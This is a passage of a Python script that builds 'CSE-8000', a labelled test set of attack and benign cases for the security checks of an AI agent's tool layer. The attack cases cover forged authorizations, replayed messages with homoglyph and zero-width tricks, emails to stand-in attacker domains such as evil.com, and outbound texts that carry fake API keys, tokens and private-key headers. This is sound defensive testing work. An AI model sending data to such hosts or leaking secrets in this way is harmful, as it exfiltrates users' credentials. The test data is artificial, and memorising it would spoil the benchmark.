    while _kind_count("tool_gate_auth", "benign") < TARGET:
        tool = rng.choice(ALL_TOOLS)
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        recip = rng.choice(EXAMPLE_RECIPIENTS)
        _make("tool_gate_auth", tool=tool, args={"to": recip}, mode="client",
              policy=pol, auth_action=tool, auth_scope={"to": recip},
              message=f"send to {recip}", expect_allowed=True)

    # --- ATTACK ---

    # Scope mismatch
    for i in range(len(EXAMPLE_RECIPIENTS)):
        auth_recip = EXAMPLE_RECIPIENTS[i]
        actual_recip = EXAMPLE_RECIPIENTS[(i + 1) % len(EXAMPLE_RECIPIENTS)]
        _make("tool_gate_auth", tool="gmail_send_email", args={"to": actual_recip},
              mode="client", policy={"enable_destructive": True},
              auth_action="gmail_send_email", auth_scope={"to": auth_recip},
              message=f"send to {auth_recip}", expect_allowed=False)

    # Expired auth
    for offset in [10000, 20000, 50000, 100000]:
        recip = EXAMPLE_RECIPIENTS[0]
        _make("tool_gate_auth", tool="gmail_send_email", args={"to": recip},
              mode="client", policy={"enable_destructive": True},
              auth_action="gmail_send_email", auth_scope={"to": recip},
              message=f"send to {recip}", timestamp_offset_sec=offset, expect_allowed=False)

    # Action mismatch
    for tool in ALL_TOOLS:
        other = [t for t in ALL_TOOLS if t != tool][0]
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        _make("tool_gate_auth", tool=tool, args={}, mode="client",
              policy=pol, auth_action=other, auth_scope={},
              message="do something", expect_allowed=False)

    # Destructive not enabled
    _make("tool_gate_auth", tool="gmail_send_email", args={}, mode="client",
          policy={"enable_destructive": False},
          auth_action="gmail_send_email", auth_scope={},
          message="send", expect_allowed=False)

    # Not in allowlist
    _make("tool_gate_auth", tool="gmail_send_email", args={}, mode="server",
          policy={"enable_destructive": True, "capability_scopes": {"search_knowledge": {}}},
          auth_action="gmail_send_email", auth_scope={},
          message="send", expect_allowed=False)

    # Bulk attack
    rng_a = _rng  # was: random.Random(5002)
    while _kind_count("tool_gate_auth", "attack") < TARGET:
        tool = rng_a.choice(ALL_TOOLS)
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        variant = rng_a.randint(0, 3)
        if variant == 0:
            # Action mismatch
            other = rng_a.choice([t for t in ALL_TOOLS if t != tool])
            _make("tool_gate_auth", tool=tool, args={}, mode="client",
                  policy=pol, auth_action=other, auth_scope={},
                  message="action", expect_allowed=False)
        elif variant == 1:
            # Expired
            _make("tool_gate_auth", tool=tool, args={}, mode="client",
                  policy=pol, auth_action=tool, auth_scope={},
                  message="expired", timestamp_offset_sec=rng_a.randint(10000, 100000),
                  expect_allowed=False)
        elif variant == 2:
            # Scope mismatch
            _make("tool_gate_auth", tool=tool, args={"to": "alice@example.com"},
                  mode="client", policy=pol,
                  auth_action=tool, auth_scope={"to": "bob@example.com"},
                  message="scope mismatch", expect_allowed=False)
        else:
            # Destructive not enabled
            tool = rng_a.choice(DESTRUCTIVE)
            _make("tool_gate_auth", tool=tool, args={}, mode="client",
                  policy={}, auth_action=tool, auth_scope={},
                  message="no enable", expect_allowed=False)


# =========================================================================
# 6. BINDING REPLAY (500 benign + 500 attack)
# =========================================================================
#
# run_binding_replay: authorize(tool, args, message), bind, then check with
# replay_message.  Pass iff replay_message hashes to same as message.
# =========================================================================

def _gen_binding_replay() -> None:
    # --- BENIGN (same message) ---

    messages_benign = [
        "Please send email to Alice about the meeting",
        "Delete all temporary files",
        "Search for recent orders",
        "Update the user profile",
        "Transfer $500 to savings",
        "Create a new calendar event for Monday",
        "Reply to the email from Bob",
        "Modify the labels on the inbox",
        "Write the quarterly report to disk",
        "Execute the backup script now",
        "Send a Slack message to the team",
        "Delete the draft email about the merger",
        "Search the knowledge base for security policies",
        "List all files in the project directory",
        "Get the weather forecast for New York",
        "Query the database for recent transactions",
        "Read the document about compliance requirements",
        "Forward the invoice to accounting",
        "Schedule a meeting with the design team",
        "Cancel the appointment with Dr. Smith",
        "Run the deployment pipeline for staging",
        "Check the server status and report back",
        "Compile the project and run unit tests",
        "Merge the feature branch into main",
        "Review the pull request from team lead",
        "Update dependencies to latest versions",
        "Backup the database before migration",
        "Restore the deleted files from archive",
        "Generate the monthly analytics report",
        "Notify the security team about the incident",
    ]
    for msg in messages_benign:
        recip = EXAMPLE_RECIPIENTS[len(msg) % len(EXAMPLE_RECIPIENTS)]
        _make("binding_replay", tool="gmail_send_email", args={"to": recip},
              message=msg, replay_message=msg,
              policy={"enable_destructive": True}, expect_allowed=True)

    # Various tools
    for tool in ALL_TOOLS:
        msg = f"Execute {tool} action now"
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        _make("binding_replay", tool=tool, args={},
              message=msg, replay_message=msg,
              policy=pol, expect_allowed=True)

    # Bulk benign
    rng = _rng  # was: random.Random(6001)
    while _kind_count("binding_replay", "benign") < TARGET:
        msg = "".join(rng.choices(string.ascii_letters + " ", k=rng.randint(20, 80)))
        tool = rng.choice(ALL_TOOLS)
        pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
        _make("binding_replay", tool=tool, args={},
              message=msg, replay_message=msg,
              policy=pol, expect_allowed=True)

    # --- ATTACK (different message) ---

    messages_attack = messages_benign[:10]

    # Appended text
    for msg in messages_attack:
        _make("binding_replay", tool="gmail_send_email", args={"to": "alice@example.com"},
              message=msg, replay_message=msg + " please",
              policy={"enable_destructive": True}, expect_allowed=False)

    # Case changed
    for msg in messages_attack:
        _make("binding_replay", tool="gmail_send_email", args={"to": "alice@example.com"},
              message=msg, replay_message=msg.upper(),
              policy={"enable_destructive": True}, expect_allowed=False)

    # Completely different
    for msg in messages_attack:
        _make("binding_replay", tool="gmail_send_email", args={"to": "alice@example.com"},
              message=msg, replay_message=f"completely different message {len(msg)}",
              policy={"enable_destructive": True}, expect_allowed=False)

    # Mutations
    mutation_base = "Please process this important document"
    mutations = [
        mutation_base + "!",
        "URGENT: " + mutation_base,
        "Please process this importnat document",
        "Please process this document",
        "Please process this very important document",
        "Please process this\nimportant document",
        "Please process  this important document",
        mutation_base[::-1],
        mutation_base + mutation_base,
        "Ple\u0430se process this important document",
        "Please\u200Bprocess this important document",
        "\u202e" + mutation_base,
        mutation_base + " ",
        " " + mutation_base,
    ]
    for mutated in mutations:
        _make("binding_replay", tool="gmail_send_email", args={"to": "alice@example.com"},
              message=mutation_base, replay_message=mutated,
              policy={"enable_destructive": True}, expect_allowed=False)

    # Bulk attack
    rng_a = _rng  # was: random.Random(6002)
    while _kind_count("binding_replay", "attack") < TARGET:
        variant = rng_a.randint(0, 2)
        if variant == 0:
            # Message changed
            msg_a = "".join(rng_a.choices(string.ascii_letters + " ", k=rng_a.randint(20, 60)))
            msg_b = msg_a + rng_a.choice(["!", " extra", "X", " modified"])
            tool = rng_a.choice(ALL_TOOLS)
            pol = {"enable_destructive": True} if tool in DESTRUCTIVE else {}
            _make("binding_replay", tool=tool, args={},
                  message=msg_a, replay_message=msg_b,
                  policy=pol, expect_allowed=False)
        elif variant == 1:
            # Totally different
            msg_a = "".join(rng_a.choices(string.ascii_letters + " ", k=30))
            msg_b = "".join(rng_a.choices(string.ascii_letters + " ", k=30))
            _make("binding_replay", tool="gmail_send_email", args={"to": "alice@example.com"},
                  message=msg_a, replay_message=msg_b,
                  policy={"enable_destructive": True}, expect_allowed=False)
        else:
            # Case swapped
            msg = "".join(rng_a.choices(string.ascii_letters + " ", k=40))
            _make("binding_replay", tool="search_knowledge", args={},
                  message=msg, replay_message=msg.swapcase(),
                  policy={}, expect_allowed=False)


# =========================================================================
# 7. ACTION GATE (500 benign + 500 attack)
# =========================================================================
#
# run_action_gate: uses RejectExternalEmailHandler which returns
# recipient.endswith("@example.com").  use_handler=False -> no handler -> deny.
# Non-destructive detection is internal to action_gate.
# =========================================================================

def _gen_action_gate() -> None:
    # --- BENIGN ---

    # Destructive with handler allowing @example.com recipients
    for recip in EXAMPLE_RECIPIENTS:
        _make("action_gate", tool="gmail_send_email", args={"to": recip},
              summary=f"send email to {recip}", expect_confirmed=True)

    # Various destructive tools with @example.com
    for tool in DESTRUCTIVE:
        recip = EXAMPLE_RECIPIENTS[DESTRUCTIVE.index(tool) % len(EXAMPLE_RECIPIENTS)]
        _make("action_gate", tool=tool, args={"to": recip},
              summary=f"{tool} to {recip}", expect_confirmed=True)

    # Bulk benign
    rng = _rng  # was: random.Random(7001)
    while _kind_count("action_gate", "benign") < TARGET:
        tool = rng.choice(DESTRUCTIVE)
        recip = rng.choice(EXAMPLE_RECIPIENTS)
        _make("action_gate", tool=tool, args={"to": recip},
              summary=f"send to {recip}", expect_confirmed=True)

    # --- ATTACK ---

    # External recipients (non-@example.com)
    external_domains = [
        "evil.com", "attacker.org", "bad-actor.net", "phish.io",
        "malware.biz", "scam.co", "hack.me", "dark.web",
    ]
    for domain in external_domains:
        for i in range(5):
            _make("action_gate", tool="gmail_send_email",
                  args={"to": f"target-{i}@{domain}"},
                  summary=f"send email to target-{i}@{domain}",
                  expect_confirmed=False)

    # No handler
    for tool in DESTRUCTIVE:
        _make("action_gate", tool=tool, args={"to": "alice@example.com"},
              summary=f"{tool} action", use_handler=False, expect_confirmed=False)

    # Mixed: external + no handler
    for tool in DESTRUCTIVE[:5]:
        _make("action_gate", tool=tool, args={"to": "evil@bad.com"},
              summary=f"{tool} to evil", use_handler=False, expect_confirmed=False)

    # Bulk attack
    rng_a = _rng  # was: random.Random(7002)
    while _kind_count("action_gate", "attack") < TARGET:
        variant = rng_a.randint(0, 2)
        if variant == 0:
            # External recipient
            domain = rng_a.choice(external_domains)
            name = "".join(rng_a.choices(string.ascii_lowercase, k=5))
            _make("action_gate", tool="gmail_send_email",
                  args={"to": f"{name}@{domain}"},
                  summary=f"send to {name}@{domain}",
                  expect_confirmed=False)
        elif variant == 1:
            # No handler
            tool = rng_a.choice(DESTRUCTIVE)
            _make("action_gate", tool=tool, args={"to": "alice@example.com"},
                  summary=f"{tool}", use_handler=False, expect_confirmed=False)
        else:
            # External + non-email tool (args.get("to","") won't be @example.com)
            tool = rng_a.choice(DESTRUCTIVE)
            _make("action_gate", tool=tool, args={"data": "payload"},
                  summary=f"{tool} action",
                  expect_confirmed=False)


# =========================================================================
# 8. OUTBOUND CHECK (500 benign + 500 attack)
# =========================================================================
#
# run_outbound: process_inbound(inbound, ctx), then check_outbound(outbound, ctx).
# Secret patterns in outbound -> block (even with quoting).
# High-entropy tokens -> block.
# Quoting directive + no secrets -> allow (skips overlap checks).
# =========================================================================

def _gen_outbound_check() -> None:
    # --- BENIGN ---

    clean_texts = [
        "The weather today is sunny with a high of 72 degrees.",
        "Hi Alice, just wanted to follow up on our meeting.",
        "The project deadline is next Friday at 5pm.",
        "Please review the attached document and provide feedback.",
        "Meeting notes from the quarterly planning session.",
        "Updated the configuration file with new settings.",
        "The API returned a 200 OK response with valid data.",
        "User profile was successfully created in the database.",
        "The backup completed without any errors or warnings.",
        "Next steps include testing and deployment to staging.",
        "Thank you for your inquiry about the project.",
        "The meeting is scheduled for 2pm on Monday.",
        "Here is a summary of the discussion.",
        "The spreadsheet has been updated successfully.",
        "Looking forward to hearing from you soon.",
        "Best regards from the development team.",
        "The temperature today is 72 degrees Fahrenheit.",
        "Please find the document attached to this email.",
        "The report has been filed for your review.",
        "All systems are operating normally.",
    ]
    for text in clean_texts:
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound=f"reference doc {len(text)}", outbound=text,
              has_quoting_directive=True, expect_allowed=True)

    # Short tokens (below secret pattern minimum)
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe", outbound="Try sk-abc (too short)",
          has_quoting_directive=True, expect_allowed=True)
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe", outbound="ghp_tooshort is not valid",
          has_quoting_directive=True, expect_allowed=True)

    # Low-entropy tokens
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe", outbound="Value: " + "a" * 30,
          has_quoting_directive=True, expect_allowed=True)
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe", outbound="Code: " + "ab" * 15,
          has_quoting_directive=True, expect_allowed=True)

    # Hex all-same-byte (low entropy)
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe", outbound="Hash: " + "aa" * 20,
          has_quoting_directive=True, expect_allowed=True)

    # Template clean texts
    templates = [
        "Thank you for your inquiry about {topic}.",
        "The meeting is scheduled for {time} on {day}.",
        "Here is a summary of the {topic} discussion.",
        "The {item} has been updated successfully.",
        "Our team is reviewing the {topic} proposal.",
    ]
    topics = ["the project", "billing", "the schedule", "security", "compliance"]
    times = ["2pm", "10am", "3:30pm", "noon", "9am"]
    days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"]
    items = ["document", "spreadsheet", "presentation", "report", "analysis"]
    rng = _rng  # was: random.Random(8001)
    for i in range(100):
        text = rng.choice(templates).format(
            topic=rng.choice(topics), time=rng.choice(times),
            day=rng.choice(days), item=rng.choice(items))
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound=f"ref {i}", outbound=text,
              has_quoting_directive=True, expect_allowed=True)

    # Low-variety tokens
    rng_low = _rng  # was: random.Random(8003)
    for i in range(30):
        tok = "".join(rng_low.choices("abcdefghij", k=rng_low.randint(20, 40)))
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound="safe", outbound=f"Code: {tok}",
              has_quoting_directive=True, expect_allowed=True)

    # Bulk benign
    while _kind_count("outbound_check", "benign") < TARGET:
        words = " ".join(rng.choices(
            ["the", "a", "is", "was", "will", "has", "been", "for",
             "with", "and", "or", "but", "not", "at", "on", "in",
             "to", "from", "by", "about", "project", "team", "meeting",
             "report", "data", "update", "review", "file", "system"],
            k=rng.randint(8, 20)))
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound=f"ref {_id_counter}", outbound=words,
              has_quoting_directive=True, expect_allowed=True)

    # --- ATTACK ---

    # Secret patterns
    secret_tokens = [
        "sk-abcdefghijklmnopqrstuvwxyz1234567890",
        "sk_proj_abcdefghijklmnopqrstuvwxyz",
        "sk_test_1234567890abcdefghijklmnop",
        "sk_live_abcdefghijklmnopqrstuvwxyz",
        "sk-proj-abcdefghijklmnopqrstuvwxyz1234",
        "AKIAIOSFODNN7EXAMPLE",
        "AKIAEXAMPLEKEYID1234",
        "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm",
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB",
        "gho_abcdefghijklmnopqrstuvwxyzABCDEFGHIJ123456",
        "ghs_abcdefghijklmnopqrstuvwxyzABCDEFGHIJ123456",
        "ghr_abcdefghijklmnopqrstuvwxyzABCDEFGHIJ123456",
        "xoxb-123456789-abcdefghij",
        "xoxp-1234567890-abcdefghij",
        "xoxa-1234567890-abcdefghij",
        "xoxr-1234567890-abcdefghij",
        "xoxs-1234567890-abcdefghij",
        "xoxb-123456789-987654321-abcdefghijklmnop",
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123",
        "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature123",
    ]
    for token in secret_tokens:
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound="safe", outbound=f"Found this: {token}", expect_allowed=False)

    # Private key headers
    for key_type in ["RSA ", "EC ", "DSA ", "OPENSSH ", ""]:
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound="safe", outbound=f"-----BEGIN {key_type}PRIVATE KEY-----\ndata...",
              expect_allowed=False)

    # Multiple secrets
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe",
          outbound="Keys: sk-abc123def456ghi789jkl012 and AKIAIOSFODNN7EXAMPLE",
          expect_allowed=False)

    # Quoting directive still blocks secrets
    _make("outbound_check", source_type="web_content", content_type="plaintext",
          inbound="safe",
          outbound="Quote: sk-abcdefghijklmnopqrstuvwxyz1234567890",
          has_quoting_directive=True, expect_allowed=False)

    # High-entropy tokens (pre-validated to exceed 4.5 bits)
    rng_ent = _rng  # was: random.Random(8004)
    for i in range(50):
        high_ent = _make_high_entropy_token(rng_ent, length=40)
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound="safe", outbound=f"Token: {high_ent}", expect_allowed=False)

    # Hex-encoded secrets (pre-validated decoded entropy >= 4.5 bits)
    rng_hex = _rng  # was: random.Random(8005)
    for i in range(30):
        hex_secret = _make_high_entropy_hex(rng_hex, n_bytes=30)
        _make("outbound_check", source_type="web_content", content_type="plaintext",
              inbound="safe", outbound=f"Data: {hex_secret}", expect_allowed=False)

    # Bulk attack
    rng_a = _rng  # was: random.Random(8002)
    while _kind_count("outbound_check", "attack") < TARGET:
        variant = rng_a.randint(0, 2)
        if variant == 0:
            # sk- prefix pattern (always matches secret regex)
            key_len = rng_a.randint(20, 40)
            prefix = rng_a.choice(["sk-", "sk_"])
            key = prefix + "".join(rng_a.choices(string.ascii_letters + string.digits, k=key_len))
            _make("outbound_check", source_type="web_content", content_type="plaintext",
                  inbound="safe", outbound=f"Here is the key: {key}", expect_allowed=False)
        elif variant == 1:
            # High-entropy token (pre-validated)
            tok = _make_high_entropy_token(rng_a, length=rng_a.randint(25, 45))
            _make("outbound_check", source_type="web_content", content_type="plaintext",
                  inbound="safe", outbound=f"Reference: {tok}", expect_allowed=False)
        else:
            # Hex-encoded secret (pre-validated decoded entropy)
            hex_secret = _make_high_entropy_hex(rng_a, n_bytes=30)
            _make("outbound_check", source_type="web_content", content_type="plaintext",
                  inbound="safe", outbound=f"Data: {hex_secret}", expect_allowed=False)


# ---------------------------------------------------------------------------
# Hashing utilities
# ---------------------------------------------------------------------------

def _sha256_json(payload: Any) -> str:
    raw = json.dumps(payload, sort_keys=True, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    return hashlib.sha256(raw).hexdigest()


def _sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _git_sha() -> str:
    try:
        proc = subprocess.run(
            ["git", "rev-parse", "HEAD"], cwd=ROOT,
            capture_output=True, text=True, check=False)
        if proc.returncode == 0 and proc.stdout.strip():
            return proc.stdout.strip()
    except Exception:
        pass
    return "unknown"


# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def build(force: bool = False) -> Path:
    global _cases, _id_counter
    _cases = []
    _id_counter = 0
    _rng.seed(SEED)

    out_dir = DATASETS_ROOT / OUTPUT_ID
    if out_dir.exists() and not force:
        print(f"Output directory exists: {out_dir}")
        print("Use --force to overwrite.")
        raise SystemExit(1)
    out_dir.mkdir(parents=True, exist_ok=True)

    # Generate all cases
    _gen_source_gate()
    _gen_validation()
    _gen_tool_gate()
    _gen_rate_limit()
    _gen_tool_gate_auth()
    _gen_binding_replay()
    _gen_action_gate()
    _gen_outbound_check()

    # Verify counts
    all_balanced = True
    print("Per-kind breakdown:")
    for kind in SURFACE_KINDS:
        atk = _kind_count(kind, "attack")
        ben = _kind_count(kind, "benign")
        total = atk + ben
        ok = "OK" if (atk == TARGET and ben == TARGET) else "MISS"
        if ok == "MISS":
            all_balanced = False
        print(f"  {kind:<20} {total:>5}  attack={atk:<5} benign={ben:<5}  {ok}")

    if not all_balanced:
        print("\nWARNING: some kinds not balanced at 500/500!")

    # Sort by (kind, id)
    _cases.sort(key=lambda c: (c.get("kind", ""), c.get("id", "")))

    # Write cases.jsonl
    cases_path = out_dir / "cases.jsonl"
    with cases_path.open("w") as f:
        for case in _cases:
            f.write(json.dumps(case, ensure_ascii=True, sort_keys=True) + "\n")

    # Write case_manifest.json
    manifest = [{
        "id": str(c.get("id", "")),
        "suite": str(c.get("suite", "")),
        "kind": str(c.get("kind", "")),
        "case_sha256": _sha256_json(c),
    } for c in _cases]
    manifest.sort(key=lambda r: (r["suite"], r["id"], r["kind"]))
    manifest_path = out_dir / "case_manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")

    # Write METADATA.json
    kind_counts = Counter(str(c.get("kind", "")) for c in _cases)
    suite_counts = Counter(str(c.get("suite", "")) for c in _cases)
    label_counts = Counter("attack" if _is_attack_like(c) else "benign" for c in _cases)

    sde = os.getenv("SOURCE_DATE_EPOCH")
    built_at = int(sde) if sde else int(time.time())
    git_sha = _git_sha()

    metadata = {
        "dataset_id": OUTPUT_ID,
        "description": "CSE-8000: 8 surface kinds, 1000 cases each (500 attack + 500 benign)",
        "dataset_hash_sha256": _sha256_json(_cases),
        "case_count_total": len(_cases),
        "kind_counts": dict(sorted(kind_counts.items())),
        "suite_counts": dict(sorted(suite_counts.items())),
        "label_counts": dict(sorted(label_counts.items())),
        "target_per_kind": 1000,
        "target_per_side": TARGET,
        "seed": SEED,
        "case_manifest_sha256": _sha256_text(manifest_path.read_text()),
        "cases_jsonl_sha256": _sha256_text(cases_path.read_text()),
        "source_date_epoch": int(sde) if sde else None,
        "built_at_unix": built_at,
        "git_sha": git_sha,
        "git_sha_short": git_sha[:7] if git_sha != "unknown" else "unknown",
    }
    (out_dir / "METADATA.json").write_text(json.dumps(metadata, indent=2, sort_keys=True) + "\n")

    print(f"\nCSE-8000 built: {out_dir}")
    print(f"Total: {len(_cases)} cases")
    print(f"Labels: {dict(sorted(label_counts.items()))}")
    print(f"Hash: {metadata['dataset_hash_sha256']}")
    return out_dir


def main() -> int:
    parser = argparse.ArgumentParser(description="Build the CSE-8000 balanced dataset")
    parser.add_argument("--force", action="store_true", help="Overwrite existing dataset")
    args = parser.parse_args()
    build(force=args.force)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
